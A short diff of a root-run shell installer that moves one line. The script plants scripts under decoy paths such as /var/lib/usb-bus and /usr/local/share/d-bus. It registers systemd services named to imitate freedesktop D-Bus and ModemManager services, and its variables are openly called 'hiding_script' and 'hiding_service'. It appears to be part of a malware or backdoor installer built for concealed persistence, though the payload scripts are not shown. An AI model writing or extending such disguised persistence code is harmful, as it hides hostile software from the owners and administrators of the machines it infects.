@@ -66,9 +66,9 @@ if [ "$user" == "root" ]; then
   echo "--create the systemd scripts and services--"
   mkdir /var/lib/usb-bus 2>/dev/null
   create_script "$hiding_script" "/var/lib/usb-bus/usb-bus"
+  create_service "$hiding_service" "dbus-org.freedesktop.Modem.service"
   mkdir /usr/local/share/d-bus 2>/dev/null
   create_script "$bash_script" "/usr/local/share/d-bus/d-bus"
-  create_service "$hiding_service" "dbus-org.freedesktop.Modem.service"
   create_service "$bash_service" "dbus-org.freedesktop.ModemManager11.service"
 
   #--install prerequisite programs--
